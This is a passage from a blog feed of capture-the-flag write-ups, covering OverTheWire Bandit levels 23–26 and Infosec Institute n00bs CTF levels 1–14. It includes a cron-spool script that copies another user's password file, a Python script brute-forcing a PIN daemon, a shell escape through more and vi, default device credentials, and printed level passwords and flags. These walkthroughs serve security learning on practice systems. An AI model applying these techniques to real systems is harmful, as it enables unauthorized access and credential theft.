</span><span class='line'>    if [ "$i" != "." -a "$i" != ".." ];
</span><span class='line'>    then
</span><span class='line'>  echo "Handling $i"
</span><span class='line'>  timeout -s 9 60 "./$i"
</span><span class='line'>  rm -f "./$i"
</span><span class='line'>    fi
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>


<p>So this script executes and then deletes all scripts in the /var/spool/bandit24 directory. We can place a script of our own in there to copy the password of the bandit24 user in a location we have access to. I made a directory in /tmp/ first:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit23@melinda:/tmp$ mkdir stuff
</span><span class='line'>bandit23@melinda:/tmp$ cd stuff</span></code></pre></td></tr></table></div></figure>


<p>Then I made a file that will hold the password later and gave it the most liberal permissions possible:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit23@melinda:/tmp/stuff$ touch readme.txt
</span><span class='line'>bandit23@melinda:/tmp/stuff$ chmod 777 readme.txt</span></code></pre></td></tr></table></div></figure>


<p>Next, I made a script that will be executed by cron. It just copies the bandit24 password to the file I&rsquo;ve created earlier.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit23@melinda:/tmp/stuff$ cat &gt; exeme.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'>cat /etc/bandit_pass/bandit24 &gt; /tmp/stuff/readme.txt</span></code></pre></td></tr></table></div></figure>


<p>I gave my script super permissive rights, then copied it to <em>/var/spool/bandit24</em> to be executed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit23@melinda:/tmp/stuff$ chmod 777 exeme.sh
</span><span class='line'>bandit23@melinda:/tmp/stuff$ cp exeme.sh /var/spool/bandit24/</span></code></pre></td></tr></table></div></figure>


<p>Waited a bit, then profit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit23@melinda:/tmp/stuff$ cat readme.txt
</span><span class='line'>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</span></code></pre></td></tr></table></div></figure>


<h3>Level 24 &ndash;> Level 25</h3>

<p>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinaties, called brute-forcing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit24@melinda:~$ nc -vv localhost 30002
</span><span class='line'>Connection to localhost 30002 port [tcp/*] succeeded!
</span><span class='line'>I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.</span></code></pre></td></tr></table></div></figure>


<p>Meh, this means we&rsquo;ll have to bruteforce the pincode and try until the daemon says it&rsquo;s correct. I wrote a quick Python script for that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">PIN_CHARS</span> <span class="o">=</span> <span class="s">&#39;0123456789&#39;</span> <span class="c"># digits that can be in a pin</span>
</span><span class='line'><span class="n">PIN_LEN</span> <span class="o">=</span> <span class="mi">4</span> <span class="c"># pin length</span>
</span><span class='line'>
</span><span class='line'><span class="n">wrong</span> <span class="o">=</span> <span class="s">&#39;Wrong!&#39;</span> <span class="c"># part of the msg received for wrong data</span>
</span><span class='line'><span class="n">fail</span> <span class="o">=</span> <span class="s">&#39;Fail!&#39;</span> <span class="c"># msg received if data doesn&#39;t respect constraints</span>
</span><span class='line'><span class="n">normal</span> <span class="o">=</span> <span class="s">&#39;I am the pincode checker&#39;</span> <span class="c"># normal msg</span>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s">&#39;127.0.0.1&#39;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">30002</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">computePins</span><span class="p">(</span><span class="n">iterables</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot;</span>
</span><span class='line'><span class="sd">    Build a list of all possible pin combinations that meet the constraints</span>
</span><span class='line'><span class="sd">    &quot;&quot;&quot;</span>
</span><span class='line'>    <span class="n">pins</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">iterables</span><span class="p">,</span> <span class="n">repeat</span> <span class="o">=</span> <span class="n">r</span><span class="p">):</span>
</span><span class='line'>        <span class="n">pins</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">pin</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">pins</span>
</span><span class='line'>
</span><span class='line'><span class="n">pinlist</span> <span class="o">=</span> <span class="n">computePins</span><span class="p">(</span><span class="n">PIN_CHARS</span><span class="p">,</span> <span class="n">PIN_LEN</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="n">pinlist</span><span class="p">:</span>
</span><span class='line'>    <span class="n">msg</span> <span class="o">=</span> <span class="s">&#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ </span><span class="si">%s</span><span class="se">\n</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">pin</span>
</span><span class='line'>    <span class="n">reply</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">wrong</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">reply</span> <span class="ow">and</span> <span class="n">fail</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">reply</span> <span class="ow">and</span> <span class="n">normal</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">reply</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">msg</span><span class="p">,</span> <span class="n">reply</span>
</span><span class='line'>        <span class="k">break</span>
</span></code></pre></td></tr></table></div></figure>


<p>And running it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit24@melinda:/tmp/b24mine$ ./bandit24.py 
</span><span class='line'>UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5670
</span><span class='line'>Correct!
</span><span class='line'>The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG</span></code></pre></td></tr></table></div></figure>


<h3>Level 25 &ndash;> Level 26</h3>

<p>Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.</p>

<p>After logging in I found a SSH private key for level 26 just lying around:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit25@melinda:~$ ls
</span><span class='line'>bandit26.sshkey</span></code></pre></td></tr></table></div></figure>


<p>But when using it to log in, the connection closes immediately, after showing this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  _                     _ _ _   ___   __  
</span><span class='line'> | |                   | (_) | |__ \ / /  
</span><span class='line'> | |__   __ _ _ __   __| |_| |_   ) / /_  
</span><span class='line'> | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
</span><span class='line'> | |_) | (_| | | | | (_| | | |_ / /| (_) |
</span><span class='line'> |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
</span><span class='line'>Connection to bandit.labs.overthewire.org closed.</span></code></pre></td></tr></table></div></figure>


<p>After reading a bit about how to find out another user&rsquo;s shell, what worked was looking in <code>/etc/passwd</code> for that specific user and checking the shell field (last one):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/passwd | grep bandit26
</span><span class='line'>bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext</span></code></pre></td></tr></table></div></figure>


<p>Cool, we have something! Let&rsquo;s look at it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bandit25@melinda:~$ cat /usr/bin/showtext
</span><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>more ~/text.txt
</span><span class='line'>exit 0</span></code></pre></td></tr></table></div></figure>


<p>So this shell uses <em>more</em> to display the contents of the text.txt file. Since <em>more</em> only displays one screen at a time, we want to see what else is contained in that file, but we don&rsquo;t have access to it, nor can we do anything about the shell. So the only way to proceed is to thoroughly read the <em>more</em> manpage and see if we can find something useful..</p>

<p>So, apparently it&rsquo;s possible to start an editor from more, and that rang a bell because <em>vi</em> was listed among the commands that might be needed to solve this level. And then maybe we can see inside the file some more (see what I did there? xD)</p>

<p>Since I wasn&rsquo;t sure how to proceed on the bandit system, I tested it on my own box first, by using <em>more</em> on a file large enough to activate it:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/bandit/more.png" title="more" alt="more"></p>

<p>And pressing v dropped me into Vim!</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/bandit/vi.png" title="vi" alt="vi"></p>

<p>That gives a way to view the file beyond the first screen. But in the login shell, there was no interaction, I couldn&rsquo;t get <em>more</em> to step in..wouldn&rsquo;t even have known about it without checking the shell. But when I played around on my box some more, if using <em>more</em> on a very small file, it would just output its contents, the same way as <em>cat</em>, so there would be no indication that <em>more</em> was used to display it. Just like via SSH! So it means that text.txt file doesn&rsquo;t really have anything than that bandit ASCII art. But I wanted to check, and wasn&rsquo;t sure how to enter into the <em>more</em> prompt by logging in&hellip;it turns out that can be done by making the terminal window small!</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/bandit/small_more.png" title="small login for more" alt="small is more"></p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/bandit/more_shell.png" title="more" alt="more"></p>

<p>Bingo! From here we can drop in <em>vi</em>! But as expected, there is nothing else in the file. I admit I don&rsquo;t use <em>vi</em> and the few times I needed to use it for something I had to follow instructions by looking on the internet, so it took me a little more reading before I stumbled upon <a href="http://stackoverflow.com/questions/1169805/how-to-load-another-files-content-to-current-file-in-vim">this very useful SO post</a>. It&rsquo;s possible to read another file by inserting it into the current file! You can do this by typing <code>:r newfile</code>:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/bandit/vi_read.png" title="vi read" alt="vi read"></p>

<p>Next I had to scroll through some warnings about multiple swap files, and at the end I saw the password inserted where the cursor was!</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/bandit/bandit26_pass.png" title="bandit 26 password" alt="bandit 26"></p>

<p>So the password is <em>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</em>, and this was a hell of a fun level to complete! :D</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>The /etc/passwd file is a text file that describes user login accounts for the system.</p>

<p> Each line of the file describes a single user, and contains seven colon-separated fields:</p>

<p>name:password:UID:GID:GECOS:directory:shell</p>

<p>shell       This is the program to run at login</p>

<p>more is a filter for paging through text one screenful at a time. This version is especially primitive.</p>

<p>Interactive commands for more are based on vi(1).</p>

<p>v           Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is
not defined, or defaults to &ldquo;vi&rdquo; if neither VISUAL nor EDITOR is defined.</p></blockquote>

<h3>Level 26 &ndash;> Level 27</h3>

<p>At this moment, level 27 does not exist yet.</p>

<p>Ok, coming back to this was lots of fun, and 2 more levels have been added since I solved it the first time, so perhaps more will be added in the future as well. The bandit wargame has been one of my favorites, and level 26 was really interesting!</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/bandit/cookie.png" title="fortune cookie" alt="cookie"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Infosec Institute n00bs CTF Labs]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/05/infosec-institute-n00bs-ctf-labs/"/>
    <updated>2015-06-05T13:39:07-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/05/infosec-institute-n00bs-ctf-labs</id>
    <content type="html"><![CDATA[<p>It&rsquo;s been a while since I&rsquo;ve last polished my web hacking skills, and I recently found out about these CTF challenges. Too late for the bounty though..</p>

<p>You can access the labs at <a href="http://ctf.infosecinstitute.com/index.php">http://ctf.infosecinstitute.com/index.php</a></p>

<!-- more -->


<h3>Level 1</h3>

<p>This is straightforward, just listen to Yoda:</p>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level1.png" title="level1" alt="level1"></p>

<p>You can find the flag in the source: <code>infosec_flagis_welcome</code></p>

<h3>Level 2</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level2.png" title="level2" alt="level2"></p>

<p>Found the image in the source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;img/leveltwo.jpeg&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>When clicking on it, there is this error:</p>

<p><code>The image “view-source:<a href="http://ctf.infosecinstitute.com/img/leveltwo.jpeg%E2%80%9D">http://ctf.infosecinstitute.com/img/leveltwo.jpeg%E2%80%9D</a> cannot be displayed because it contains errors.</code></p>

<p>Downloaded it and ran <em>strings</em> on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# strings leveltwo.jpeg 
</span><span class='line'>aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=</span></code></pre></td></tr></table></div></figure>


<p>Well, well. This isn&rsquo;t suspicious at all! :D After you Base64 decode it, you get the flag: <code>infosec_flagis_wearejuststarting</code></p>

<h3>Level 3</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level3.png" title="level3" alt="level3"></p>

<p>I used an <a href="http://www.onlinebarcodereader.com/">online barcode scanner</a> that produced this output: <code>.. &ndash;. ..&ndash;. &mdash;&ndash; &hellip; . &ndash;.&ndash;. ..&ndash;. .&ndash;.. .&ndash; &mdash;. .. &hellip; &mdash; &mdash;&ndash; .&ndash;. &hellip; .. &ndash;. &mdash;.</code>. Well, that seems familiar..Morse code! Used <a href="http://www.onlineconversion.com/morse_code.htm">this site</a> to decode it: <code>INFOSECFLAGISMORSING</code></p>

<h3>Level 4</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level4.png" title="level4" alt="level4"></p>

<p>If you hover over the image with your mouse, a popup appears with the message <em>Stop poking me!</em>. Looking in the source, the Javascript function responsible for that is called <code>poke()</code>, and you can find it in the <code>custom.js</code> file. All it does is alert the message. I spent some time here going in a wrong direction, disabling Javascript, and trying to see if something is hidden in the image. The hint states HTTP, and I did look at the headers and all, and it&rsquo;s not often that you see a cookie called <em>fusrodah</em>. But initially I didn&rsquo;t think it was pertaining to this specific level, because it was present in the requests to other levels as well. But when I hit a blank on everything else, I returned to it and ran it in some decoders:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fusrodah=vasbfrp_syntvf_jrybirpbbxvrf</span></code></pre></td></tr></table></div></figure>


<p>And I hit the jackpot with a Caesar shift of 13: <code>infosec_flagis_welovecookies</code></p>

<h3>Level 5</h3>

<p>When you click on Level 5, you immediatelly get a popup saying <em>Hacker!!!</em>. I disabled Javascript to see this image:</p>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level5.png" title="level5" alt="level5"></p>

<p>Right, back to the thing I hate most, steganography. Stegdetect didn&rsquo;t find anything, and I didn&rsquo;t have any luck with StegExpose either. Surprisingly, an online tool came to help: <a href="https://futureboy.us/stegano/decinput.html">https://futureboy.us/stegano/decinput.html</a></p>

<p>The output was this string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>01101001011011100110011001101111011100110110010101100011010111110110011001101100011000010110011101101001011100110101111101110011011101000110010101100111011000010110110001101001011001010110111001110011</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>which I then ran in a binary decoder: <code>infosec_flagis_stegaliens</code></p>

<h3>Level 6</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level6.png" title="level6" alt="level6"></p>

<p>Packet analysis is not really my thing, so the way I solved this was by just following streams until I hit on something potentially interesting: the string <code>696e666f7365635f666c616769735f736e6966666564</code>, contained in the first UDP packet, with a source and destination of 127.0.0.1. This was actually the hex encoded flag: <code>infosec_flagis_sniffed</code></p>

<h3>Level 7</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level7.png" title="level7" alt="level7"></p>

<p>I tried to manually navigate to levelseven.php and all I got was a blank page. But when I looked at the request with Live HTTP Headers, I noticed this: <code>HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==</code>. A base64 encoded string&hellip;and decoding it gives the flag: <code>infosec_flagis_youfoundit</code></p>

<h3>Level 8</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level8.png" title="level8" alt="level8"></p>

<p>Well, didn&rsquo;t expect to solve it just by running <em>strings</em>, but that&rsquo;s all you need to do! :D The flag is in the <em>strings</em> output: <code>infosec_flagis_0x1a</code></p>

<h3>Level 9</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level9.png" title="level9" alt="level9"></p>

<p>No SQLi involved here..so I googled for Cisco IDS Web Login System password. Eventually I found the credentials that work on <a href="http://www.anameless.com/blog/default-passwords.html">this page</a> that contains default passwords for a number of devices. The ones that worked were <code>root:attack</code>. A popup appeared with the flag <code>ssaptluafed_sigalf_cesofni</code>, which is the reverse for <code>infosec_flagis_defaultpass</code></p>

<h3>Level 10</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level10.png" title="level10" alt="level10"></p>

<p>Played the .wav file, it sounded like something being fast forwarded. So I launched Audacity, and under Effect->Change Speed, you can play with the Speed Multiplier (some 0.20 and lower) until you hear a voice telling you the flag: <code>infosec_flagis_sound</code></p>

<h3>Level 11</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level11.png" title="level11" alt="level11"></p>

<p>Right, that huge PHP image is suspicious. I downloaded it and ran <em>strings</em> on it to begin with, and:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm</span></code></pre></td></tr></table></div></figure>


<p>Base64? Yes it is! Decoding it gives the address of another image: <a href="http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif">http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif</a></p>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/powerslide.png" title="powerslide" alt="powerslide"></p>

<p>Couldn&rsquo;t find anything hidden in this image, so I guess <code>infosec_flagis_powerslide</code></p>

<h3>Level 12</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level12.png" title="level12" alt="level12"></p>

<p>Spent some time scratching my head at this one, because I couldn&rsquo;t find anything. Since I was just jumping over the initial section of the page source, with the CSS files and all, I was missing the relevant information. So, if you look in the source and you compare it with other pages, you can see that there is a new CSS file, called <em>design.css</em>, with the following inside:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='css'><span class='line'><span class="nc">.thisloveis</span><span class="p">{</span>
</span><span class='line'>  <span class="k">color</span><span class="o">:</span> <span class="m">#696e666</span><span class="n">f7365635f666c616769735f686579696d6e6f7461636f6c6f72</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And if you decode that hex string, you get the flag: <code>infosec_flagis_heyimnotacolor</code></p>

<h3>Level 13</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level13.png" title="level13" alt="level13"></p>

<p>I kept trying editing the URL and adding file extensions commonly associated with backup files from <a href="http://www.file-extensions.org/filetype/extension/name/backup-files">this list</a>. Eventually, stumbled upon one that works: the <em>.old</em> file extension.</p>

<p><a href="http://file.org/extension/old">What is an OLD file?</a>:</p>

<blockquote><p>Files that contain the .old file extension are most commonly used to indicate that a file on a user&rsquo;s hard drive is a backup copy of a newer
version of the file. The .old extension is given to the file name when the newer version of the file is saved within the associated computer
application.</p>

<p>The initial file extension is often kept intact when the .old file extension is assigned to a file. For example, if the original version of a file
is saved as mydocument.doc, then when a new version of the file is created that version will also be saved with the name of mydocument.doc.
However, in order to store a copy of the old version of the file, the original version will be saved with the name as mydocument.doc.old.</p></blockquote>

<p>So when I added <em>.old</em> to the URL, I got a message if I want to open or download levelthirteen.php.old. Ok, now we&rsquo;re getting somewhere! Ran <em>strings</em> on it (again!) and noticed an extra something in the source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>/* <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;img/clippy1.jpg&quot;</span> <span class="na">class=</span><span class="s">&quot;imahe&quot;</span> <span class="nt">/&gt;</span> <span class="nt">&lt;br</span> <span class="nt">/&gt;</span> <span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;p&gt;</span>Do you want to download this mysterious file?<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;misc/imadecoy&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">&quot;btn&quot;</span><span class="nt">&gt;</span>Yes<span class="nt">&lt;/button&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/a&gt;</span>
</span><span class='line'>    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;index.php&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">&quot;btn&quot;</span><span class="nt">&gt;</span>No<span class="nt">&lt;/button&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/a&gt;</span>
</span><span class='line'>    */
</span></code></pre></td></tr></table></div></figure>


<p>I went to <a href="http://ctf.infosecinstitute.com/misc/imadecoy">http://ctf.infosecinstitute.com/misc/imadecoy</a> and you can download the mysterious file. Apparently it&rsquo;s another job for Wireshark:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# file imadecoy
</span><span class='line'>imadecoy: tcpdump capture file (little-endian) - version 2.4 (Linux "cooked", capture length 65535)</span></code></pre></td></tr></table></div></figure>


<p>Ok, more random following streams and trying to glean what&rsquo;s interesting. Eventually, I reached this part:</p>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/imadecoy.png" title="imadecoy" alt="imadecoy"></p>

<p>The GET request for that HoneyPY.PNG image occurs a few times after first spotting it. So the image might be interesting. And it&rsquo;s possible to reconstruct it from the packet file! Click on the relevant packet:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>633  46.399534   127.0.0.1   127.0.0.1   HTTP    1955    HTTP/1.1 200 OK  (PNG)</span></code></pre></td></tr></table></div></figure>


<p>Then go to File->Export Objects->HTTP. Wireshark will then give you all the HTTP objects list:</p>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/http_objects.png" title="http object list" alt="http objects"></p>

<p>We&rsquo;re only interested in the image, which is the last one. I saved it, and&hellip;</p>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/flag13.png" title="flag13" alt="flag13"></p>

<h3>Level 14</h3>

<p><img class="center" src="http://chousensha.github.io/images/infosec_institute_ctf/level14.png" title="level14" alt="level14"></p>

<p>The file is a phpMyAdmin SQL Dump. If you scroll through it, towards the end there will be this table:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-- Dumping data for table `friends`
</span><span class='line'>--
</span><span class='line'>
</span><span class='line'>INSERT INTO `friends` (`id`, `name`, `address`, `status`) VALUES
